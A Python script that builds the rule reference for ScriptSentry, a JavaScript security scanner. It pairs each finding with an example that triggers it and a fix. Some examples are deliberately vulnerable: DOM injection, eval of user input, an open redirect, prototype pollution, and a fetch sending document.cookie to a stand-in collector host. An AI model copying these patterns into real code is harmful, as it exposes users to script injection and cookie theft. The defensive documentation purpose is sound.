#!/usr/bin/env python3
"""Render the ScriptSentry rule reference from the engine itself.

"What does finding X mean and how do I fix it?" is the first question a
report raises, and the answer already exists in the engine's plain-language
registry (``core/reporter.py`` ``PLAIN_TERMS``) -- the same text the reports
use. This tool turns that registry into two artifacts that cannot drift from
it:

* ``webui/rules/index.html`` -- the hosted rule reference page (same chrome
  as the rest of the static site), and
* ``docs/RULES.md`` -- the repository copy for GitHub browsing.

Each rule adds a curated *example* and *fix* snippet (the only content that
lives here) plus severity and kind; the meaning/action text always comes
from ``PLAIN_TERMS``. The generator refuses to build if a ``PLAIN_TERMS``
entry has no rule section, so a new finding id cannot ship undocumented.

Run it after changing detection rules::

    python3 tools/build_rules_page.py          # regenerate both artifacts
    python3 tools/build_rules_page.py --check  # exit 1 if out of date
"""

from __future__ import annotations

import html
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tools"))

from core.reporter import PLAIN_TERMS  # noqa: E402
import build_changelog as chrome  # noqa: E402

WEBUI = ROOT / "webui"
INDEX = WEBUI / "home" / "index.html"
OUT_PAGE = WEBUI / "rules" / "index.html"
OUT_DOC = ROOT / "docs" / "RULES.md"

PAGE_TITLE = "Rule reference — ScriptSentry"
PAGE_DESCRIPTION = (
    "What every ScriptSentry finding means in plain language, how severe it "
    "is, and what the fix usually looks like -- generated from the engine's "
    "own rule registry."
)

# Curated documentation: example and fix snippets per finding. Meaning and
# action text never live here -- they come from PLAIN_TERMS so the docs and
# the reports always say the same thing.
RULES = [
    # --- actionable findings, worst first -------------------------------
    {"id": "dom_injection", "title": "DOM injection", "severity": "HIGH", "kind": "vulnerability",
     "example": "const q = new URLSearchParams(location.search).get('q');\nel.innerHTML = q;",
     "fix": "el.textContent = q;  // or sanitize with DOMPurify before innerHTML"},
    {"id": "dom_injection_document_write", "title": "DOM injection (document.write)",
     "severity": "HIGH", "kind": "vulnerability",
     "example": "document.write('<b>' + location.hash.slice(1) + '</b>');",
     "fix": "const el = document.createElement('b');\nel.textContent = location.hash.slice(1);\ndocument.body.appendChild(el);"},
    {"id": "hardcoded_secret", "title": "Hardcoded secret candidate", "severity": "HIGH",
     "kind": "vulnerability",
     "example": "const apiKey = \"kx9vQm2LpTn8Rb4Wc6Yd3Zf7Hj5\";\nfetch('https://api.example.com/v2?key=' + apiKey);",
     "fix": "// Read the key from server-side configuration instead:\n// fetch('/api/keys/current')  -- the secret never ships in the bundle"},
    {"id": "data_exfiltration_flow", "title": "Sensitive data sent to a network sink",
     "severity": "HIGH", "kind": "vulnerability",
     "example": "fetch('https://collector.example/log?c=' + document.cookie);",
     "fix": "// Remove the call, or gate it to your own origin with the\n// minimum data it actually needs."},
    {"id": "open_redirect", "title": "Client-side open redirect", "severity": "HIGH",
     "kind": "vulnerability",
     "example": "const next = new URLSearchParams(location.search).get('next');\nlocation = next;",
     "fix": "const ALLOWED = new Set(['/dashboard', '/profile']);\nif (ALLOWED.has(next)) location = next;  // allowlist, never a raw value"},
    {"id": "dangerous_dynamic_code", "title": "Dangerous dynamic code execution",
     "severity": "HIGH", "kind": "vulnerability",
     "example": "eval(userInput);\nsetTimeout('go(' + input + ')', 100);\nwindow[String.fromCharCode(101,118,97,108)](payload);",
     "fix": "JSON.parse(input);            // for data\nsetTimeout(() => go(input), 100);  // for behaviour: pass a function"},
    {"id": "vulnerable_dependency:", "title": "Vulnerable dependency (npm advisory)",
     "severity": "HIGH", "kind": "vulnerability",
     "example": "// package.json\n\"dependencies\": { \"left-pad\": \"1.0.0\" }  // matches a known advisory",
     "fix": "npm audit fix  // or pin a patched version and verify the upgrade"},
    {"id": "exposed_key_iv_pair", "title": "Exposed key + IV pair", "severity": "MEDIUM",
     "kind": "vulnerability",
     "example": "const key = '0123456789abcdef';\nconst iv  = 'abcdef9876543210';",
     "fix": "// Hardcoding the IV alongside the key defeats its purpose.\n// Generate a random IV per message and send it alongside the ciphertext."},
    {"id": "static_crypto_key", "title": "Static cryptographic key", "severity": "MEDIUM",
     "kind": "vulnerability",
     "example": "const key = CryptoJS.enc.Utf8.parse('my-secret-key-123');",
     "fix": "// Move encryption to the server, or derive keys per session\n// via the WebCrypto API -- never embed the key in shipped code."},
    {"id": "insecure_postmessage", "title": "Insecure postMessage (wildcard origin)",
     "severity": "MEDIUM", "kind": "vulnerability", "meaning": 'The code sends a message to another window and explicitly allows ANY origin to receive it. If the receiving page is ever embedded by an attacker-controlled page, that page receives the message too.', "action": 'Name the exact origin instead of the wildcard, and validate the payload on the receiving side.',
     "example": "window.parent.postMessage(session, '*');",
     "fix": "window.parent.postMessage(session, 'https://app.example.com');"},
    {"id": "prototype_pollution", "title": "Prototype pollution pattern", "severity": "MEDIUM",
     "kind": "vulnerability", "meaning": "The code merges or writes objects in a way that can modify JavaScript's shared prototypes when the input comes from the page address or user data. Successful pollution can change application logic everywhere.", "action": 'Validate untrusted objects against a schema and reject keys like __proto__ and constructor before merging.',
     "example": "Object.assign(cfg, JSON.parse('{' + location.hash.slice(1) + '}'));",
     "fix": "// Validate untrusted objects against a schema and reject\n// __proto__/constructor keys before merging."},
    {"id": "jquery_dom_manipulation", "title": "jQuery DOM manipulation with untrusted data",
     "severity": "MEDIUM", "kind": "vulnerability", "meaning": 'jQuery DOM methods that interpret HTML are fed data that may come from the page address or user input -- the jQuery sibling of DOM injection.', "action": 'Use .text() for plain values, or sanitize with DOMPurify before calling .html()/.append() with markup.',
     "example": "$('#output').html(decodeURI(location.hash));",
     "fix": "$('#output').text(decodeURI(location.hash));"},

    # --- observations: worth knowing, not necessarily broken -------------
    {"id": "data_exfiltration_candidate", "title": "URL-derived data sent to an external destination",
     "severity": "LOW", "kind": "observation",
     "example": "fetch('https://cdn.example.com/track?from=' + location.href);",
     "fix": "// Review: URL data to a third party is often analytics, not a leak."},
    {"id": "sensitive_storage", "title": "Sensitive value in browser storage",
     "severity": "MEDIUM", "kind": "observation",
     "example": "localStorage.setItem('authToken', token);",
     "fix": "// XSS makes localStorage readable; prefer httpOnly cookies\n// for anything that authenticates a user."},
    {"id": "unsafe_runtime", "title": "Risky runtime pattern", "severity": "LOW", "kind": "observation",
     "example": "new Function(decodeURIComponent(payload))();",
     "fix": "// Static pattern only: confirm what executes and prefer explicit code."},
    {"id": "api_surface", "title": "API surface mapped", "severity": "INFO", "kind": "observation", "meaning": 'An inventory observation: the code calls endpoints that look like an API. Not a vulnerability by itself -- the map exists so endpoints can be reviewed for server-side authorization and rate limiting.', "action": 'Use the API map to review each endpoint: does it need auth? Does it rate-limit? Is it still supposed to exist?',
     "example": "fetch('https://api.example.com/v2/users?page=2');",
     "fix": "// Inventory only: use the API map to spot endpoints that\n// should require server-side authorization."},
    {"id": "obfuscation", "title": "Obfuscation indicators", "severity": "LOW", "kind": "observation", "meaning": 'The code uses encoding and string-building patterns typical of obfuscated bundles. Obfuscation is not malicious by itself, but it hides behaviour from review.', "action": 'Beautify and deobfuscate the bundle, then re-scan the readable code before trusting it.',
     "example": "var _0x1a2b = ['\\x61\\x6c\\x65\\x72\\x74'];",
     "fix": "// Flagged for review: obfuscation hides behaviour.\n// Beautify and deobfuscate before trusting the code."},
    {"id": "client_side_crypto", "title": "Client-side cryptography in use", "severity": "INFO",
     "kind": "observation", "meaning": 'An inventory observation: cryptographic work happens in the browser. Fine for checksums and local scrambling; never a substitute for server-side secrecy.', "action": 'Anything encrypted in the client is visible to a determined user -- keep real secrets on the server.',
     "example": "const hash = CryptoJS.SHA256(input).toString();",
     "fix": "// Fine for checksums; never a substitute for server-side\n// secrecy -- anything in the client is visible to the user."},
]

# Plain-language entries whose ids are legacy aliases shown in one shared
# note instead of their own section.
ALIASES = {
    "dom_xss": "older reports used this id for DOM injection findings",
    "secret": "value-shape secret hits reported before the id was split",
}

KIND_LABEL = {
    "vulnerability": "Actionable finding",
    "observation": "Observation",
}


def plain_entry(rule_id):
    """The PLAIN_TERMS entry for a rule id (exact or prefix key)."""
    if rule_id in PLAIN_TERMS:
        return PLAIN_TERMS[rule_id]
    prefix = rule_id if rule_id.endswith(":") else rule_id + ":"
    return PLAIN_TERMS.get(prefix)


def e(text):
    return html.escape(str(text or ""), quote=False)


def render_markdown():
    lines = [
        "# Rule reference",
        "",
        "What every ScriptSentry finding means, how severe it is, and what the",
        "fix usually looks like. **Generated from the engine's own rule",
        "registry** (`core/reporter.py` `PLAIN_TERMS`) by `tools/build_rules_page.py`",
        "— the docs and the reports always speak the same language.",
        "",
        "Severity is the *default* label; the scanner can raise or lower it per",
        "finding based on evidence and confidence. Observations are behaviour",
        "worth knowing about, not confirmed problems.",
        "",
    ]
    current_kind = None
    for rule in RULES:
        if rule["kind"] != current_kind:
            current_kind = rule["kind"]
            heading = "Actionable findings" if current_kind == "vulnerability" else "Observations"
            lines += [f"## {heading}", ""]
        entry = plain_entry(rule["id"]) or {}
        lines += [
            f"### `{rule['id'].rstrip(':')}` — {rule['title']}",
            "",
            f"**Default severity:** {rule['severity']} · **Kind:** {KIND_LABEL[rule['kind']]}",
            "",
            f"**What it means.** {entry.get('meaning', rule.get('meaning', ''))}",
            "",
            f"**What to do.** {entry.get('action', rule.get('action', ''))}",
            "",
            "Example that triggers it:",
            "",
            "```js",
            rule["example"].rstrip(),
            "```",
            "",
            "The usual fix:",
            "",
            "```js",
            rule["fix"].rstrip(),
            "```",
            "",
        ]
    lines += ["## Legacy ids", ""]
    lines += [f"- `{alias}` — {note}." for alias, note in ALIASES.items()]
    lines.append("")
    return "\n".join(lines)


def render_sections():
    """HTML sections for the hosted page."""
    out = []
    current_kind = None
    for rule in RULES:
        if rule["kind"] != current_kind:
            current_kind = rule["kind"]
            heading = "Actionable findings" if current_kind == "vulnerability" else "Observations"
            if out:
                out.append("      </section>")
            out.append(f'      <section class="release" id="{e(rule["kind"])}s">')
            out.append(f"        <h2>{e(heading)}</h2>")
        entry = plain_entry(rule["id"]) or {}
        anchor = e(rule["id"].rstrip(":"))
        sev = e(rule["severity"].lower())
        out.append(f'        <article class="rule" id="rule-{anchor}">')
        out.append(f'          <h3><code>{anchor}</code> — {e(rule["title"])}'
                   f' <span class="sev-chip sev-{sev}">{e(rule["severity"])}</span></h3>')
        out.append(f'          <p class="rule-meaning"><strong>What it means.</strong> {e(entry.get("meaning", rule.get("meaning", "")))}</p>')
        out.append(f'          <p class="rule-meaning"><strong>What to do.</strong> {e(entry.get("action", rule.get("action", "")))}</p>')
        out.append('          <div class="code-box">')
        out.append(f'            <pre>{e(rule["example"].rstrip())}</pre>')
        out.append("          </div>")
        out.append('          <div class="code-box">')
        out.append(f'            <pre>{e(rule["fix"].rstrip())}</pre>')
        out.append("          </div>")
        out.append("        </article>")
    if out:
        out.append("      </section>")
    aliases = " ".join(f"<code>{e(a)}</code> ({e(n)})" for a, n in ALIASES.items())
    out.append("      <section class=\"release\" id=\"legacy-ids\">")
    out.append("        <h2>Legacy ids</h2>")
    out.append(f"        <p>Older reports used ids that map to the rules above: {aliases}.</p>")
    out.append("      </section>")
    return "\n".join(out)


def build_page(sections_html):
    src = INDEX.read_text(encoding="utf-8")
    head = chrome.slice_block(src, "<head>", "</head>", "head")
    header = chrome.slice_block(src, "<header", "</header>", "site header")
    footer = chrome.slice_block(src, "<footer", "</footer>", "site footer")

    # The head swaps are the changelog builder's pattern with this page's
    # title and description.
    head = chrome.re.sub(r"<title>.*?</title>", f"<title>{PAGE_TITLE}</title>", head, flags=chrome.re.S)
    head = chrome.re.sub(r'(<meta name="description" content=")[^"]*(")',
                         lambda m: m.group(1) + PAGE_DESCRIPTION + m.group(2), head)
    head = chrome.re.sub(r'(<meta property="og:title" content=")[^"]*(")',
                         lambda m: m.group(1) + "ScriptSentry — Rule reference" + m.group(2), head)
    head = chrome.re.sub(r'(<meta property="og:description" content=")[^"]*(")',
                         lambda m: m.group(1) + PAGE_DESCRIPTION + m.group(2), head)

    header = chrome.adapt_header(header)
    # This page belongs in the nav next to Setup: inject a Rules link.
    connect = '<a href="../home/#connect">Connect</a>'
    rules_link = '<a href="../rules/" aria-current="page">Rules</a>'
    if connect not in header:
        raise SystemExit("Could not find the Connect link to inject the Rules nav item.")
    header = header.replace(connect, rules_link + "\n        " + connect)
    footer = chrome.relink(footer)

    banner = ("      <!-- Generated from the engine's PLAIN_TERMS registry by "
              "tools/build_rules_page.py -- do not hand-edit. -->")
    page = f"""<!DOCTYPE html>
<html lang="en">
{head}{banner}
<body>
{header}
  <main class="wrap" id="main">
    <header class="changelog-intro">
      <span class="section-kicker">Detection rules</span>
      <h1>Rule reference</h1>
      <p class="changelog-sub">What every finding means in plain language, and what the fix usually looks like — generated from the engine, so the docs and the reports always agree.</p>
    </header>

    <div class="changelog">
{sections_html}
    </div>

    <p class="changelog-back"><a href="../home/#features">&larr; Back to What It Finds</a></p>
    <p class="changelog-back"><a href="../tool/">Open the analyzer &rarr;</a></p>
  </main>
{footer}
  <script src="../app.js"></script>
</body>
</html>
"""
    return page


def main(argv=None):
    argv = list(sys.argv[1:] if argv is None else argv)
    check_only = "--check" in argv

    # Anti-drift: every plain-language entry must have a rule section (or be
    # an explicitly documented legacy alias).
    covered = {r["id"].rstrip(":") for r in RULES} | set(ALIASES)
    missing = [key.rstrip(":") for key in PLAIN_TERMS if key.rstrip(":") not in covered]
    if missing:
        raise SystemExit("PLAIN_TERMS has entries with no rule section: " + ", ".join(sorted(missing)))

    page = build_page(render_sections())
    doc = render_markdown()

    if check_only:
        ok = True
        if OUT_PAGE.exists() and OUT_PAGE.read_text(encoding="utf-8") != page:
            print("webui/rules/index.html is out of date", file=sys.stderr)
            ok = False
        if OUT_DOC.exists() and OUT_DOC.read_text(encoding="utf-8") != doc:
            print("docs/RULES.md is out of date", file=sys.stderr)
            ok = False
        return 0 if ok else 1

    OUT_PAGE.parent.mkdir(parents=True, exist_ok=True)
    OUT_PAGE.write_text(page, encoding="utf-8")
    OUT_DOC.parent.mkdir(parents=True, exist_ok=True)
    OUT_DOC.write_text(doc, encoding="utf-8")
    print(f"Wrote {OUT_PAGE.relative_to(ROOT)} ({OUT_PAGE.stat().st_size:,} bytes)")
    print(f"Wrote {OUT_DOC.relative_to(ROOT)} ({OUT_DOC.stat().st_size:,} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
